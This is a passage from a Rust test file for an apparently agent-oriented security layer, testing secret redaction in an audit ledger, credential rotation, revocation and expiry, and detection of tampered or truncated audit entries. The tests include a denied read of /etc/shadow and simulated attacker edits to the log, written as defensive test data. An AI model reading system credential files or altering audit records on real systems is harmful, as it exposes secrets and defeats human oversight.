    // 4. Audit ledger automatically scrubs sensitive tokens in reasons and capabilities
    let ledger = AuditLedger::open_persistent(&harness.audit_file).unwrap();
    let receipt = ledger.record(
        SubsystemId::Bridge,
        Capability::Tool(ToolCapability::CliCommand(format!(
            "curl -H 'Authorization: Bearer {token}' https://api.github.com"
        ))),
        DecisionOutcome::Granted,
        format!("Authorized sync for token {token}"),
    );

    assert!(
        !receipt.reason.contains(token),
        "Audit receipt reason must never contain raw tokens"
    );
    assert!(
        !format!("{:?}", receipt.capability).contains(token),
        "Audit receipt capability must never contain raw tokens"
    );
    assert!(receipt.reason.contains("[REDACTED_SECRET]"));
}

#[test]
fn test_adversarial_credential_rotation_and_revocation() {
    let harness = TestHarness::new();
    let vault = CredentialStore::open_persistent(&harness.vault_dir).unwrap();

    let initial_sec = "initial_secret_version_1";
    let rotated_sec = "rotated_secret_version_2";

    // 1. Store initial credential
    vault
        .store_credential(
            SubsystemId::Bridge,
            "service_token",
            initial_sec,
            "*",
            chrono::Duration::hours(2),
        )
        .unwrap();

    let handle1 = vault
        .get_handle(SubsystemId::Bridge, "service_token", "*")
        .unwrap();
    assert_eq!(
        vault
            .execute_with_secret(&handle1, SubsystemId::Bridge, |s| s.to_string())
            .unwrap(),
        initial_sec
    );

    // 2. Rotate credential
    vault
        .rotate_credential(SubsystemId::Bridge, "service_token", rotated_sec)
        .unwrap();

    let handle2 = vault
        .get_handle(SubsystemId::Bridge, "service_token", "*")
        .unwrap();
    assert_eq!(
        vault
            .execute_with_secret(&handle2, SubsystemId::Bridge, |s| s.to_string())
            .unwrap(),
        rotated_sec
    );

    // 3. Revoke specific handle
    vault.revoke_handle(handle2.handle_id);
    let revoked_exec = vault.execute_with_secret(&handle2, SubsystemId::Bridge, |_| ());
    assert_eq!(
        revoked_exec,
        Err(CredentialError::Revoked(handle2.handle_id))
    );

    // 4. Expired handle rejected
    let expired_handle = CredentialHandle {
        handle_id: Uuid::new_v4(),
        owner: SubsystemId::Bridge,
        key: "service_token".into(),
        scope: "*".into(),
        expires_at: chrono::Utc::now() - chrono::Duration::seconds(10),
    };
    let expired_exec = vault.execute_with_secret(&expired_handle, SubsystemId::Bridge, |_| ());
    assert_eq!(
        expired_exec,
        Err(CredentialError::Expired(expired_handle.handle_id))
    );

    // 5. Revoke entire credential
    vault
        .revoke_credential(SubsystemId::Bridge, "service_token")
        .unwrap();
    let get_after_revoke = vault.get_handle(SubsystemId::Bridge, "service_token", "*");
    assert!(matches!(
        get_after_revoke,
        Err(CredentialError::NotFound(..))
    ));
}

// ------------------------------------------------------------------------------------------------
// [Issue #33]: Durable Tamper-Evident Audit Ledger & Truncation/Corruption Detection
// ------------------------------------------------------------------------------------------------

#[test]
fn test_adversarial_durable_audit_tampering_and_truncation_detection() {
    let harness = TestHarness::new();

    // 1. Create durable audit ledger and write records
    {
        let ledger = AuditLedger::open_persistent(&harness.audit_file).expect("Failed to open audit log");
        ledger.record(
            SubsystemId::Dialogue,
            Capability::System(SystemCapability::OsTelemetry),
            DecisionOutcome::Granted,
            "Telemetry check",
        );
        ledger.record(
            SubsystemId::Bridge,
            Capability::Tool(ToolCapability::KernelTool("fs:query".into())),
            DecisionOutcome::Granted,
            "Workspace file query",
        );
        ledger.record(
            SubsystemId::Agents,
            Capability::Filesystem(FsCapability::Read { path: PathBuf::from("/etc/shadow") }),
            DecisionOutcome::Denied,
            "Sandbox denied /etc read",
        );
        assert_eq!(ledger.len(), 3);
        assert!(ledger.verify_chain());
    }

    // 2. Normal restart boot-time verification
    {
        let reloaded = AuditLedger::open_persistent(&harness.audit_file).expect("Verification failed on boot");
        assert_eq!(reloaded.len(), 3);
        assert!(reloaded.verify_chain());
    }

    // 3. Attacker modifies one byte in the second audit entry
    let log_content = fs::read_to_string(&harness.audit_file).unwrap();
    let lines: Vec<&str> = log_content.trim().lines().collect();
    assert_eq!(lines.len(), 3);

    // Tamper with sequence 2
    let tampered_line2 = lines[1].replace("Workspace file query", "Tampered attacker message");
    let tampered_log = format!("{}\n{}\n{}\n", lines[0], tampered_line2, lines[2]);
    fs::write(&harness.audit_file, tampered_log).unwrap();

    // Boot-time verification MUST catch the tampered entry
    let boot_result = AuditLedger::open_persistent(&harness.audit_file);
    assert!(
        matches!(boot_result, Err(AuditIntegrityError::TamperedEntry { sequence: 2, .. })),
        "Boot verification must detect tampered record content"
    );

    // 4. Attacker deletes/truncates sequence 2 (sequence broken 1 -> 3)
    let truncated_log = format!("{}\n{}\n", lines[0], lines[2]);
    fs::write(&harness.audit_file, truncated_log).unwrap();

    let boot_result_trunc = AuditLedger::open_persistent(&harness.audit_file);
    assert!(
        matches!(boot_result_trunc, Err(AuditIntegrityError::SequenceBroken { .. })),
        "Boot verification must detect deleted or skipped sequence entries"
    );
}
